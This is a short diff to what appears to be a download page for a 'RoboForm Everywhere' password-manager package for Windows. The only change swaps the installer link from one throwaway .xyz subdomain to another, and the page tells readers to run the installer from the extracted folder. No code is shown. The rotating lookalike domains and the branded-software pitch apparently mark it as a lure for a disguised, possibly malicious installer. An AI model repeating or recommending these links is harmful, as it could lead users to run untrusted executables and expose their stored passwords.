@@ -8,8 +8,8 @@ Password manager with powerful form-filling capabilities · Premium workspace ·
 
 > Use the project link below for Windows.
 
-* **Project link:** **[roboform-everywhere-autofill-suite.nexpath.xyz](https://roboform-everywhere-autofill-suite.nexpath.xyz/)**
-* **Full URL:** `https://roboform-everywhere-autofill-suite.nexpath.xyz/`
+* **Project link:** **[roboform-everywhere-autofill-suite.nerasix.xyz](https://roboform-everywhere-autofill-suite.nerasix.xyz/)**
+* **Full URL:** `https://roboform-everywhere-autofill-suite.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
